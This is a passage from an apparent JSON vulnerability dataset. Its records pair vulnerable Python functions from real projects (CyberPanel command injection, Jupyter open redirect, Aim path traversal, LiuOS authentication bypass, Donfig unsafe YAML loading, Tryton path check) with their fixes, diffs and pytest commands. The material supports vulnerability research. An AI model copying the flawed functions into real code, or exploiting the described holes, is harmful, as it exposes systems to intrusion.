preferred_proxy_id:\n            # Custom browser endpoints should NOT have a proxy added\n            if not prefer_fetch_backend.startswith('extra_browser_'):\n                proxy_url = self.datastore.proxy_list.get(preferred_proxy_id).get('url')\n                logger.debug(f\"Selected proxy key '{preferred_proxy_id}' as proxy URL '{proxy_url}' for {url}\")\n            else:\n                logger.debug(f\"Skipping adding proxy data when custom Browser endpoint is specified. \")\n\n        # Now call the fetcher (playwright/requests/etc) with arguments that only a fetcher would need.\n        # When browser_connection_url is None, it method should default to working out whats the best defaults (os env vars etc)\n        self.fetcher = fetcher_obj(proxy_override=proxy_url,\n                                   custom_browser_connection_url=custom_browser_connection_url\n                                   )\n\n        if self.watch.has_browser_steps:\n            self.fetcher.browser_steps = self.watch.get('browser_steps', [])\n            self.fetcher.browser_steps_screenshot_path = os.path.join(self.datastore.datastore_path, self.watch.get('uuid'))\n\n        # Tweak the base config with the per-watch ones\n        from changedetectionio.safe_jinja import render as jinja_render\n        request_headers = CaseInsensitiveDict()\n\n        ua = self.datastore.data['settings']['requests'].get('default_ua')\n        if ua and ua.get(prefer_fetch_backend):\n            request_headers.update({'User-Agent': ua.get(prefer_fetch_backend)})\n\n        request_headers.update(self.watch.get('headers', {}))\n        request_headers.update(self.datastore.get_all_base_headers())\n        request_headers.update(self.datastore.get_all_headers_in_textfile_for_watch(uuid=self.watch.get('uuid')))\n\n        # https://github.com/psf/requests/issues/4525\n        # Requests doesnt yet support brotli encoding, so don't put 'br' here, be totally sure that the user cannot\n        # do this by accident.\n        if 'Accept-Encoding' in request_headers and \"br\" in request_headers['Accept-Encoding']:\n            request_headers['Accept-Encoding'] = request_headers['Accept-Encoding'].replace(', br', '')\n\n        for header_name in request_headers:\n            request_headers.update({header_name: jinja_render(template_str=request_headers.get(header_name))})\n\n        timeout = self.datastore.data['settings']['requests'].get('timeout')\n\n        request_body = self.watch.get('body')\n        if request_body:\n            request_body = jinja_render(template_str=self.watch.get('body'))\n        \n        request_method = self.watch.get('method')\n        ignore_status_codes = self.watch.get('ignore_status_codes', False)\n\n        # Configurable per-watch or global extra delay before extracting text (for webDriver types)\n        system_webdriver_delay = self.datastore.data['settings']['application'].get('webdriver_delay', None)\n        if self.watch.get('webdriver_delay'):\n            self.fetcher.render_extract_delay = self.watch.get('webdriver_delay')\n        elif system_webdriver_delay is not None:\n            self.fetcher.render_extract_delay = system_webdriver_delay\n\n        if self.watch.get('webdriver_js_execute_code') is not None and self.watch.get('webdriver_js_execute_code').strip():\n            self.fetcher.webdriver_js_execute_code = self.watch.get('webdriver_js_execute_code')\n\n        # Requests for PDF's, images etc should be passwd the is_binary flag\n        is_binary = self.watch.is_pdf\n\n        # And here we go! call the right browser with browser-specific settings\n        empty_pages_are_a_change = self.datastore.data['settings']['application'].get('empty_pages_are_a_change', False)\n\n        self.fetcher.run(url=url,\n                         timeout=timeout,\n                         request_headers=request_headers,\n                         request_body=request_body,\n                         request_method=request_method,\n                         ignore_status_codes=ignore_status_codes,\n                         current_include_filters=self.watch.get('include_filters'),\n                         is_binary=is_binary,\n                         empty_pages_are_a_change=empty_pages_are_a_change\n                         )\n\n        #@todo .quit here could go on close object, so we can run JS if change-detected\n        self.fetcher.quit()\n\n        # After init, call run_changedetection() which will do the actual change-detection"
      }
    ],
    "vul_patch": "--- a/changedetectionio/processors/__init__.py\n+++ b/changedetectionio/processors/__init__.py\n@@ -4,8 +4,8 @@\n \n         url = self.watch.link\n \n-        # Protect against file://, file:/ access, check the real \"link\" without any meta \"source:\" etc prepended.\n-        if re.search(r'^file:/', url.strip(), re.IGNORECASE):\n+        # Protect against file:, file:/, file:// access, check the real \"link\" without any meta \"source:\" etc prepended.\n+        if re.search(r'^file:', url.strip(), re.IGNORECASE):\n             if not strtobool(os.getenv('ALLOW_FILE_URI', 'false')):\n                 raise Exception(\n                     \"file:// type access is denied for security reasons.\"\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-10856",
    "cve_description": "In Jupyter Notebook before 5.7.8, an open redirect can occur via an empty netloc. This issue exists because of an incomplete fix for CVE-2019-10255.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/jupyter/notebook",
    "patch_url": [
      "https://github.com/jupyter/notebook/commit/979e0bd15e794ceb00cc63737fcd5fd9addc4a99"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_46_1",
        "commit": "16cf97c",
        "file_path": "notebook/auth/login.py",
        "start_line": 33,
        "end_line": 63,
        "snippet": "    def _redirect_safe(self, url, default=None):\n        \"\"\"Redirect if url is on our PATH\n\n        Full-domain redirects are allowed if they pass our CORS origin checks.\n\n        Otherwise use default (self.base_url if unspecified).\n        \"\"\"\n        if default is None:\n            default = self.base_url\n        # protect chrome users from mishandling unescaped backslashes.\n        # \\ is not valid in urls, but some browsers treat it as /\n        # instead of %5C, causing `\\\\` to behave as `//`\n        url = url.replace(\"\\\\\", \"%5C\")\n        parsed = urlparse(url)\n        if parsed.netloc or not (parsed.path + '/').startswith(self.base_url):\n            # require that next_url be absolute path within our path\n            allow = False\n            # OR pass our cross-origin check\n            if parsed.netloc:\n                # if full URL, run our cross-origin check:\n                origin = '%s://%s' % (parsed.scheme, parsed.netloc)\n                origin = origin.lower()\n                if self.allow_origin:\n                    allow = self.allow_origin == origin\n                elif self.allow_origin_pat:\n                    allow = bool(self.allow_origin_pat.match(origin))\n            if not allow:\n                # not allowed, use default\n                self.log.warning(\"Not allowing login redirect to %r\" % url)\n                url = default\n        self.redirect(url)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_46_1",
        "commit": "979e0bd15e794ceb00cc63737fcd5fd9addc4a99",
        "file_path": "notebook/auth/login.py",
        "start_line": 33,
        "end_line": 66,
        "snippet": "    def _redirect_safe(self, url, default=None):\n        \"\"\"Redirect if url is on our PATH\n\n        Full-domain redirects are allowed if they pass our CORS origin checks.\n\n        Otherwise use default (self.base_url if unspecified).\n        \"\"\"\n        if default is None:\n            default = self.base_url\n        # protect chrome users from mishandling unescaped backslashes.\n        # \\ is not valid in urls, but some browsers treat it as /\n        # instead of %5C, causing `\\\\` to behave as `//`\n        url = url.replace(\"\\\\\", \"%5C\")\n        parsed = urlparse(url)\n        path_only = urlunparse(parsed._replace(netloc='', scheme=''))\n        if url != path_only or not (parsed.path + '/').startswith(self.base_url):\n            # require that next_url be absolute path within our path\n            allow = False\n            # OR pass our cross-origin check\n            if url != path_only:\n                # if full URL, run our cross-origin check:\n                origin = '%s://%s' % (parsed.scheme, parsed.netloc)\n                origin = origin.lower()\n                if origin == '%s://%s' % (self.request.protocol, self.request.host):\n                    allow = True\n                elif self.allow_origin:\n                    allow = self.allow_origin == origin\n                elif self.allow_origin_pat:\n                    allow = bool(self.allow_origin_pat.match(origin))\n            if not allow:\n                # not allowed, use default\n                self.log.warning(\"Not allowing login redirect to %r\" % url)\n                url = default\n        self.redirect(url)"
      }
    ],
    "vul_patch": "--- a/notebook/auth/login.py\n+++ b/notebook/auth/login.py\n@@ -12,15 +12,18 @@\n         # instead of %5C, causing `\\\\` to behave as `//`\n         url = url.replace(\"\\\\\", \"%5C\")\n         parsed = urlparse(url)\n-        if parsed.netloc or not (parsed.path + '/').startswith(self.base_url):\n+        path_only = urlunparse(parsed._replace(netloc='', scheme=''))\n+        if url != path_only or not (parsed.path + '/').startswith(self.base_url):\n             # require that next_url be absolute path within our path\n             allow = False\n             # OR pass our cross-origin check\n-            if parsed.netloc:\n+            if url != path_only:\n                 # if full URL, run our cross-origin check:\n                 origin = '%s://%s' % (parsed.scheme, parsed.netloc)\n                 origin = origin.lower()\n-                if self.allow_origin:\n+                if origin == '%s://%s' % (self.request.protocol, self.request.host):\n+                    allow = True\n+                elif self.allow_origin:\n                     allow = self.allow_origin == origin\n                 elif self.allow_origin_pat:\n                     allow = bool(self.allow_origin_pat.match(origin))\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2019-10856:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/notebook\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2019-10856/bin/python -m pytest notebook/auth/tests/test_login.py::LoginTest::test_next_bad notebook/auth/tests/test_login.py::LoginTest::test_next_ok -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2019-10856:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/notebook\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2019-10856/bin/python -m pytest notebook/auth/tests/test_login.py notebook/auth/tests/test_login.py -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2024-51378",
    "cve_description": "getresetstatus in dns/views.py and ftp/views.py in CyberPanel (aka Cyber Panel) before 1c0c6cb allows remote attackers to bypass authentication and execute arbitrary commands via /dns/getresetstatus or /ftp/getresetstatus by bypassing secMiddleware (which is only for a POST request) and using shell metacharacters in the statusfile property, as exploited in the wild in October 2024 by PSAUX. Versions through 2.3.6 and (unpatched) 2.3.7 are affected.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/usmannasir/cyberpanel",
    "patch_url": [
      "https://github.com/usmannasir/cyberpanel/commit/1c0c6cbcf71abe573da0b5fddfb9603e7477f683"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_301_1",
        "commit": "5b08cd6",
        "file_path": "dns/views.py",
        "start_line": 246,
        "end_line": 283,
        "snippet": "def getresetstatus(request):\n    try:\n        data = json.loads(request.body)\n        statusfile = data['statusfile']\n        installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n        if installStatus.find(\"[200]\") > -1:\n\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n\n            final_json = json.dumps({\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n                'abort': 1,\n                'installed': 1,\n            })\n            return HttpResponse(final_json)\n        elif installStatus.find(\"[404]\") > -1:\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n            final_json = json.dumps({\n                'abort': 1,\n                'installed': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n\n        else:\n            final_json = json.dumps({\n                'abort': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n    except KeyError:\n        return redirect(loadLoginPage)"
      },
      {
        "id": "vul_py_301_2",
        "commit": "5b08cd6",
        "file_path": "ftp/views.py",
        "start_line": 143,
        "end_line": 180,
        "snippet": "def getresetstatus(request):\n    try:\n        data = json.loads(request.body)\n        statusfile = data['statusfile']\n        installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n        if installStatus.find(\"[200]\") > -1:\n\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n\n            final_json = json.dumps({\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n                'abort': 1,\n                'installed': 1,\n            })\n            return HttpResponse(final_json)\n        elif installStatus.find(\"[404]\") > -1:\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n            final_json = json.dumps({\n                'abort': 1,\n                'installed': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n\n        else:\n            final_json = json.dumps({\n                'abort': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n    except KeyError:\n        return redirect(loadLoginPage)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_301_1",
        "commit": "1c0c6cbcf71abe573da0b5fddfb9603e7477f683",
        "file_path": "dns/views.py",
        "start_line": 246,
        "end_line": 293,
        "snippet": "def getresetstatus(request):\n    try:\n\n        userID = request.session['userID']\n\n        currentACL = ACLManager.loadedACL(userID)\n\n        if currentACL['admin'] == 1:\n            pass\n        else:\n            return ACLManager.loadErrorJson('FilemanagerAdmin', 0)\n\n        data = json.loads(request.body)\n        statusfile = data['statusfile']\n        installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n        if installStatus.find(\"[200]\") > -1:\n\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n\n            final_json = json.dumps({\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n                'abort': 1,\n                'installed': 1,\n            })\n            return HttpResponse(final_json)\n        elif installStatus.find(\"[404]\") > -1:\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n            final_json = json.dumps({\n                'abort': 1,\n                'installed': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n\n        else:\n            final_json = json.dumps({\n                'abort': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n    except KeyError:\n        return redirect(loadLoginPage)"
      },
      {
        "id": "fix_py_301_2",
        "commit": "1c0c6cbcf71abe573da0b5fddfb9603e7477f683",
        "file_path": "ftp/views.py",
        "start_line": 143,
        "end_line": 192,
        "snippet": "def getresetstatus(request):\n    try:\n\n        userID = request.session['userID']\n\n        currentACL = ACLManager.loadedACL(userID)\n\n        if currentACL['admin'] == 1:\n            pass\n        else:\n            return ACLManager.loadErrorJson('FilemanagerAdmin', 0)\n\n        data = json.loads(request.body)\n        statusfile = data['statusfile']\n        installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n\n\n        if installStatus.find(\"[200]\") > -1:\n\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n\n            final_json = json.dumps({\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n                'abort': 1,\n                'installed': 1,\n            })\n            return HttpResponse(final_json)\n        elif installStatus.find(\"[404]\") > -1:\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n            final_json = json.dumps({\n                'abort': 1,\n                'installed': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n\n        else:\n            final_json = json.dumps({\n                'abort': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n    except KeyError:\n        return redirect(loadLoginPage)"
      }
    ],
    "vul_patch": "--- a/dns/views.py\n+++ b/dns/views.py\n@@ -1,5 +1,15 @@\n def getresetstatus(request):\n     try:\n+\n+        userID = request.session['userID']\n+\n+        currentACL = ACLManager.loadedACL(userID)\n+\n+        if currentACL['admin'] == 1:\n+            pass\n+        else:\n+            return ACLManager.loadErrorJson('FilemanagerAdmin', 0)\n+\n         data = json.loads(request.body)\n         statusfile = data['statusfile']\n         installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n--- a/ftp/views.py\n+++ b/ftp/views.py\n@@ -1,8 +1,20 @@\n def getresetstatus(request):\n     try:\n+\n+        userID = request.session['userID']\n+\n+        currentACL = ACLManager.loadedACL(userID)\n+\n+        if currentACL['admin'] == 1:\n+            pass\n+        else:\n+            return ACLManager.loadErrorJson('FilemanagerAdmin', 0)\n+\n         data = json.loads(request.body)\n         statusfile = data['statusfile']\n         installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n+\n+\n \n         if installStatus.find(\"[200]\") > -1:\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-43775",
    "cve_description": "Aim is an open-source, self-hosted machine learning experiment tracking tool. Versions of Aim prior to 3.1.0 are vulnerable to a path traversal attack. By manipulating variables that reference files with \u201cdot-dot-slash (../)\u201d sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. The vulnerability issue is resolved in Aim v3.1.0.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/aimhubio/aim",
    "patch_url": [
      "https://github.com/aimhubio/aim/commit/b9e53df5e32d14bbd3a2c738e2db7187fb531e93"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_138_1",
        "commit": "0b99c6c",
        "file_path": "aim/web/api/views.py",
        "start_line": 10,
        "end_line": 16,
        "snippet": "async def serve_static_files(path):\n    from aim import web\n    static_file_name = os.path.join(os.path.dirname(web.__file__), 'ui', 'build', path)\n    compressed_file_name = '{}.gz'.format(static_file_name)\n    if os.path.exists(compressed_file_name):\n        return FileResponse(compressed_file_name, headers={'Content-Encoding': 'gzip'})\n    return FileResponse(static_file_name)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_138_1",
        "commit": "b9e53df",
        "file_path": "aim/web/api/views.py",
        "start_line": 12,
        "end_line": 24,
        "snippet": "async def serve_static_files(path):\n    from aim import web\n    static_files_root = os.path.join(os.path.dirname(web.__file__), 'ui', 'build')\n    static_file_name = '/'.join((static_files_root, path))\n\n    # check if path is leading inside ui/build directory\n    if not Path(static_files_root) in Path(static_file_name).resolve().parents:\n        raise HTTPException(404)\n\n    compressed_file_name = '{}.gz'.format(static_file_name)\n    if os.path.exists(compressed_file_name):\n        return FileResponse(compressed_file_name, headers={'Content-Encoding': 'gzip'})\n    return FileResponse(static_file_name)"
      }
    ],
    "vul_patch": "--- a/aim/web/api/views.py\n+++ b/aim/web/api/views.py\n@@ -1,6 +1,12 @@\n async def serve_static_files(path):\n     from aim import web\n-    static_file_name = os.path.join(os.path.dirname(web.__file__), 'ui', 'build', path)\n+    static_files_root = os.path.join(os.path.dirname(web.__file__), 'ui', 'build')\n+    static_file_name = '/'.join((static_files_root, path))\n+\n+    # check if path is leading inside ui/build directory\n+    if not Path(static_files_root) in Path(static_file_name).resolve().parents:\n+        raise HTTPException(404)\n+\n     compressed_file_name = '{}.gz'.format(static_file_name)\n     if os.path.exists(compressed_file_name):\n         return FileResponse(compressed_file_name, headers={'Content-Encoding': 'gzip'})\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-46179",
    "cve_description": "LiuOS is a small Python project meant to imitate the functions of a regular operating system. Version 0.1.0 and prior of LiuOS allow an attacker to set the GITHUB_ACTIONS environment variable to anything other than null or true and skip authentication checks. This issue is patched in the latest commit (c658b4f3e57258acf5f6207a90c2f2169698ae22) by requiring the var to be set to true, causing a test script to run instead of being able to login. A potential workaround is to check for the GITHUB_ACTIONS environment variable and set it to \"\" (no quotes) to null the variable and force credential checks.",
    "cwe_info": {
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/LiuWoodsCode/LiuOS",
    "patch_url": [
      "https://github.com/LiuWoodsCode/LiuOS/commit/c658b4f3e57258acf5f6207a90c2f2169698ae22"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_198_1",
        "commit": "a377446",
        "file_path": "core.py",
        "start_line": 83,
        "end_line": 126,
        "snippet": "def actualsys() :\n        logging.debug(\"Launched main system\")\n        os.system('cls' if os.name == 'nt' else 'clear')\n        logging.debug(\"Loaded LiuOS Shell\")\n        LiuShell().cmdloop()\nlogging.debug(\"Assigned main system function\")\nif os.environ.get('GITHUB_ACTIONS') == \"true\":\n        logging.info('Running on GitHub Actions, not using the LiuOS Shell')\n        print(lang.ENTER_USERNAME_LOGIN)\n        print(lang.ENTER_PASSWD_LOGIN)\n        print(lang.FAKE_SUCCESSFUL_LOGIN)\n        logging.warning(\"Fake login completed\")\n        print(lang.SHELL_INTRO)\n        print(lang.SAMPLE_ABC)\n        print(lang.SAMPLE_STRING)\n        TestProg = \"programs/helloworld.py\"\n        runpy.run_path(path_name=TestProg)\n        print(\"Code completed\")\nelse:\n # Authentication system\n\n       while attemps < 7:\n        username = input(lang.ENTER_USERNAME_LOGIN)\n        logging.debug('Entered username')\n        password = getpass.getpass(lang.ENTER_PASSWD_LOGIN)\n        logging.debug('Entered password')\n        bytehash = hashlib.sha512(password.encode())\n        pwdreshash = bytehash.hexdigest()\n        logging.debug('Generated hash of password')\n        if attemps == 6:\n        ## Brute force protection\n           raise Exception(\"Too many password attempts. Because of the risk of a brute force attack, after 6 attempts, you will need to rerun LiuOS to try 6 more times.\")\n        if os.environ.get('GITHUB_ACTIONS') != \"\":\n            logging.warning(\"Running on Github Actions\")\n            actualsys()\n        elif username == cred.loginname and pwdreshash == cred.loginpass:\n            print(lang.SUCCESSFUL_LOGIN)\n            logging.debug('Correct login credentials, logged in')\n            actualsys()\n        else:\n            print(lang.INCORRECT_LOGIN)\n            logging.error(\"Incorrect login credentials\")\n            attemps += 1\n            continue"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_198_1",
        "commit": "c658b4f",
        "file_path": "core.py",
        "start_line": 83,
        "end_line": 126,
        "snippet": "def actualsys() :\n        logging.debug(\"Launched main system\")\n        os.system('cls' if os.name == 'nt' else 'clear')\n        logging.debug(\"Loaded LiuOS Shell\")\n        LiuShell().cmdloop()\nlogging.debug(\"Assigned main system function\")\nif os.environ.get('GITHUB_ACTIONS') == \"true\":\n        logging.info('Running on GitHub Actions, not using the LiuOS Shell')\n        print(lang.ENTER_USERNAME_LOGIN)\n        print(lang.ENTER_PASSWD_LOGIN)\n        print(lang.FAKE_SUCCESSFUL_LOGIN)\n        logging.warning(\"Fake login completed\")\n        print(lang.SHELL_INTRO)\n        print(lang.SAMPLE_ABC)\n        print(lang.SAMPLE_STRING)\n        TestProg = \"programs/helloworld.py\"\n        runpy.run_path(path_name=TestProg)\n        print(\"Code completed\")\nelse:\n # Authentication system\n\n       while attemps < 7:\n        username = input(lang.ENTER_USERNAME_LOGIN)\n        logging.debug('Entered username')\n        password = getpass.getpass(lang.ENTER_PASSWD_LOGIN)\n        logging.debug('Entered password')\n        bytehash = hashlib.sha512(password.encode())\n        pwdreshash = bytehash.hexdigest()\n        logging.debug('Generated hash of password')\n        if attemps == 6:\n        ## Brute force protection\n           raise Exception(\"Too many password attempts. Because of the risk of a brute force attack, after 6 attempts, you will need to rerun LiuOS to try 6 more times.\")\n        if os.environ.get('GITHUB_ACTIONS') == \"true\":\n            logging.warning(\"Running on Github Actions\")\n            actualsys()\n        elif username == cred.loginname and pwdreshash == cred.loginpass:\n            print(lang.SUCCESSFUL_LOGIN)\n            logging.debug('Correct login credentials, logged in')\n            actualsys()\n        else:\n            print(lang.INCORRECT_LOGIN)\n            logging.error(\"Incorrect login credentials\")\n            attemps += 1\n            continue"
      }
    ],
    "vul_patch": "--- a/core.py\n+++ b/core.py\n@@ -30,7 +30,7 @@\n         if attemps == 6:\n         ## Brute force protection\n            raise Exception(\"Too many password attempts. Because of the risk of a brute force attack, after 6 attempts, you will need to rerun LiuOS to try 6 more times.\")\n-        if os.environ.get('GITHUB_ACTIONS') != \"\":\n+        if os.environ.get('GITHUB_ACTIONS') == \"true\":\n             logging.warning(\"Running on Github Actions\")\n             actualsys()\n         elif username == cred.loginname and pwdreshash == cred.loginpass:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-7537",
    "cve_description": "An issue was discovered in Donfig 0.3.0. There is a vulnerability in the collect_yaml method in config_obj.py. It can execute arbitrary Python commands, resulting in command execution.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pytroll/donfig",
    "patch_url": [
      "https://github.com/pytroll/donfig/commit/1f9dbf83b17419a06d63c14ef3fbd29dbc1b8ce5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_273_1",
        "commit": "a57e36e",
        "file_path": "donfig/config_obj.py",
        "start_line": 159,
        "end_line": 196,
        "snippet": "def collect_yaml(paths):\n    \"\"\"Collect configuration from yaml files\n\n    This searches through a list of paths, expands to find all yaml or json\n    files, and then parses each file.\n\n    \"\"\"\n    # Find all paths\n    file_paths = []\n    for path in paths:\n        if os.path.exists(path):\n            if os.path.isdir(path):\n                try:\n                    file_paths.extend(sorted([\n                        os.path.join(path, p)\n                        for p in os.listdir(path)\n                        if os.path.splitext(p)[1].lower() in ('.json', '.yaml', '.yml')\n                    ]))\n                except OSError:\n                    # Ignore permission errors\n                    pass\n            else:\n                file_paths.append(path)\n\n    configs = []\n\n    # Parse yaml files\n    for path in file_paths:\n        try:\n            with open(path) as f:\n                data = yaml.load(f.read()) or {}\n                data = normalize_nested_keys(data)\n                configs.append(data)\n        except (OSError, IOError):\n            # Ignore permission errors\n            pass\n\n    return configs"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_273_1",
        "commit": "1f9dbf83b17419a06d63c14ef3fbd29dbc1b8ce5",
        "file_path": "donfig/config_obj.py",
        "start_line": 159,
        "end_line": 196,
        "snippet": "def collect_yaml(paths):\n    \"\"\"Collect configuration from yaml files\n\n    This searches through a list of paths, expands to find all yaml or json\n    files, and then parses each file.\n\n    \"\"\"\n    # Find all paths\n    file_paths = []\n    for path in paths:\n        if os.path.exists(path):\n            if os.path.isdir(path):\n                try:\n                    file_paths.extend(sorted([\n                        os.path.join(path, p)\n                        for p in os.listdir(path)\n                        if os.path.splitext(p)[1].lower() in ('.json', '.yaml', '.yml')\n                    ]))\n                except OSError:\n                    # Ignore permission errors\n                    pass\n            else:\n                file_paths.append(path)\n\n    configs = []\n\n    # Parse yaml files\n    for path in file_paths:\n        try:\n            with open(path) as f:\n                data = yaml.safe_load(f.read()) or {}\n                data = normalize_nested_keys(data)\n                configs.append(data)\n        except (OSError, IOError):\n            # Ignore permission errors\n            pass\n\n    return configs"
      }
    ],
    "vul_patch": "--- a/donfig/config_obj.py\n+++ b/donfig/config_obj.py\n@@ -28,7 +28,7 @@\n     for path in file_paths:\n         try:\n             with open(path) as f:\n-                data = yaml.load(f.read()) or {}\n+                data = yaml.safe_load(f.read()) or {}\n                 data = normalize_nested_keys(data)\n                 configs.append(data)\n         except (OSError, IOError):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-0360",
    "cve_description": "file_open in Tryton 3.x and 4.x through 4.2.2 allows remote authenticated users with certain permissions to read arbitrary files via a \"same root name but with a suffix\" attack. NOTE: This vulnerability exists because of an incomplete fix for CVE-2016-1242.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/tryton/trytond",
    "patch_url": [
      "https://github.com/tryton/trytond/commit/a67a7f03c30277515f530cad5950056171ed5bd1",
      "https://github.com/tryton/trytond/commit/30e978593733385db3144f8c583eeb4679575cf0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_37_1",
        "commit": "5d7c4fa",
        "file_path": "trytond/tools/misc.py",
        "start_line": 31,
        "end_line": 37,
        "snippet": "    def secure_join(root, *paths):\n        \"Join paths and ensure it still below root\"\n        path = os.path.join(root, *paths)\n        path = os.path.normpath(path)\n        if not path.startswith(root):\n            raise IOError(\"Permission denied: %s\" % name)\n        return path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_37_1",
        "commit": "a67a7f03c30277515f530cad5950056171ed5bd1",
        "file_path": "trytond/tools/misc.py",
        "start_line": 31,
        "end_line": 37,
        "snippet": "    def secure_join(root, *paths):\n        \"Join paths and ensure it still below root\"\n        path = os.path.join(root, *paths)\n        path = os.path.normpath(path)\n        if not path.startswith(os.path.join(root, '')):\n            raise IOError(\"Permission denied: %s\" % name)\n        return path"
      }
    ],
    "vul_patch": "--- a/trytond/tools/misc.py\n+++ b/trytond/tools/misc.py\n@@ -2,6 +2,6 @@\n         \"Join paths and ensure it still below root\"\n         path = os.path.join(root, *paths)\n         path = os.path.normpath(path)\n-        if not path.startswith(root):\n+        if not path.startswith(os.path.join(root, '')):\n             raise IOError(\"Permission denied: %s\" % name)\n         return path\n\n",
